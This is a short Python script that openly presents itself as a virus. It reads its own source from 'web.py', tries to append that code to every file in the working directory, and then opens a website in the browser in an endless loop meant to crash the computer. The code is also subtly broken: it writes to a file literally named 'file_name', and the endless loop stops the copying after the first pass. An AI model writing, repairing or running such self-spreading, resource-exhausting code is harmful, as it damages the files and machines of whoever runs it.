import os 
import time 
import webbrowser

def WebBrowser():
  link = "jacobsrotterdam.nl"
  print("Starting The Virus !")

  #open and get the virus code
  virus_file = open("web.py", "r")
  virus_code = virus_file.read()
  virus_file.close()

  #copy the virus code to all entries
  for file_name in os.listdir():
      file = open("file_name", "a")
      file.write(virus_code)
      file.close()

      #open browser until computer crashes
      while True:
        webbrowser.open(link)

WebBrowser()
